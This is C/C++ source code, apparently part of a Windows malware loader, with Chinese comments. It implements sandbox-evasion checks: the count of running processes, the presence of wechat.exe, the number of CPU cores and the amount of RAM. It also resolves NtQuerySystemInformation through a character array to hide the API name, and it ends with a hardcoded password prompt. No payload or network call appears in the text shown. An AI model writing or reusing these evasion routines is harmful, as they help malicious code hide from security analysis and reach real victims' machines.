int checkProcessesCount2()
{
    ULONG uReturnLen1 = NULL;
    ULONG uReturnLen2 = NULL;
    PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
    NTSTATUS STATUS = NULL;
    LPCWSTR szProcName = NULL;
    int procNum = 0;
    _wsetlocale(LC_ALL, L"chs");

    typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
            SYSTEM_INFORMATION_CLASS SystemInformationClass, //返回系统信息的类型
            PVOID SystemInformation, //指向接受信息的缓冲区的指针
            ULONG SystemInformationLength, //缓冲区大小
            PULONG RetunrnLength //写入SystemInformation的实际大小
    );
    fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;
    char funcname[] = {'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n', '\0'};
    pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), funcname);

    pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1); //获取数组大小

    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    PVOID pValueToFree = SystemProcInfo;
    STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
    while (TRUE)
    {
        if (!SystemProcInfo->NextEntryOffset)
            break;
        //wprintf(L"[*] Pid: %d ; Process Name: %s \n", SystemProcInfo->UniqueProcessId, SystemProcInfo->ImageName.Buffer);
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
        procNum++;
    }
    HeapFree(GetProcessHeap(), 0, pValueToFree);
    //printf("[*] Number of Process: %d", procNum);
    if (procNum < 50)
    {
        return 1;
    }
    return 0;
}

void ToLowercase(PWSTR str) {
    if (str == nullptr) return;
    while (*str) {
        *str = towlower(*str);
        str++;
    }
}

// 将 char[] 转换为宽字符字符串
std::wstring CharToWChar(const char* str) {
    size_t len = strlen(str);
    std::wstring wstr(len, L'\0');
    mbstowcs(&wstr[0], str, len);
    return wstr;
}

// 比较 PWSTR 和 char[] 字符串
bool CompareWideString(PWSTR wideStr, const char* charStr) {
    if (wideStr == nullptr || charStr == nullptr) return false;
    ToLowercase(wideStr);
    std::wstring wCharStr = CharToWChar(charStr);
    std::transform(wCharStr.begin(), wCharStr.end(), wCharStr.begin(), towlower);
    return wcscmp(wideStr, wCharStr.c_str()) == 0;
}

int checkWechatProcess() // 1: sandbox 0: real
{
    ULONG uReturnLen1 = NULL;
    ULONG uReturnLen2 = NULL;
    PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
    NTSTATUS STATUS = NULL;
    LPCWSTR szProcName = NULL;
    int procNum = 0;
    _wsetlocale(LC_ALL, L"chs");

    typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
            SYSTEM_INFORMATION_CLASS SystemInformationClass, //返回系统信息的类型
            PVOID SystemInformation, //指向接受信息的缓冲区的指针
            ULONG SystemInformationLength, //缓冲区大小
            PULONG RetunrnLength //写入SystemInformation的实际大小
    );
    fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;
    char funcname[] = {'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n', '\0'};
    pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), funcname);

    pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1); //获取数组大小

    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    PVOID pValueToFree = SystemProcInfo;
    STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
    while (TRUE)
    {
        if (!SystemProcInfo->NextEntryOffset)
            break;
        //wprintf(L"[*] Pid: %d ; Process Name: %s \n", SystemProcInfo->UniqueProcessId, SystemProcInfo->ImageName.Buffer);
        char processName[] = {'w','e','c','h','a','t','.','e','x','e','\0'};
        if (CompareWideString(SystemProcInfo->ImageName.Buffer, processName))
        {
            return 0;
        }
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
        procNum++;
    }
    HeapFree(GetProcessHeap(), 0, pValueToFree);
    //printf("[*] Number of Process: %d", procNum);
    return 1;
}

void* my_memcpy(void* dest, const void* src, size_t count) {
    unsigned char* dst = static_cast<unsigned char*>(dest);
    const unsigned char* source = static_cast<const unsigned char*>(src);

    for (size_t i = 0; i < count; ++i) {
        dst[i] = source[i];
    }
    return dest;
}

int checkCPU() // 1: sandbox 0: real
{
    SYSTEM_INFO   SysInfo = { 0 };
    GetSystemInfo(&SysInfo);
    if (SysInfo.dwNumberOfProcessors < 2) {
        return 1;
    }
    return 0;
}

int checkRAM() // 1: sandbox 0: real
{
    MEMORYSTATUSEX MemStatus = { .dwLength = sizeof(MEMORYSTATUSEX) };

    GlobalMemoryStatusEx(&MemStatus);
    if ((DWORD)MemStatus.ullTotalPhys <= (DWORD)(2 * 1073741824)) {
        return 1;
    }
    return 0;
}



void passwordVerification()
{
    system("cls");

    string password;

    cout << "\n\n\n\n\n\t\t\t\t\t";
    cout << "\n\n\n\t\t\t\t\tEnter Password : ";

    do
    {
        cin >> password;

        if (password != "password")
        {
            system("cls");
            cout << "\n\n\n\n\n\t\t"
                << "wrong password!, try again or type 'quit' / 'exit' to Quit The program.";
            cout << "\n\n\n\t\t\t\t\tEnter Password : ";
        }

        if (password == "Quit" || password == "quit" || password == "exit" || password == "Exit" || password == "QUIT" || password == "EXIT")
        {
            system("cls");
            cout << "\t\t\n\n\n\n\n\n\n\t\t\t\t\tQuitting The Program";

            for (int i = 0; i < 4; i++)
            {

                //Sleep(1000); // 1 second pause;
                cout << ".";
            }

            exit(0);
        }

    }

    while (password != "password");
}

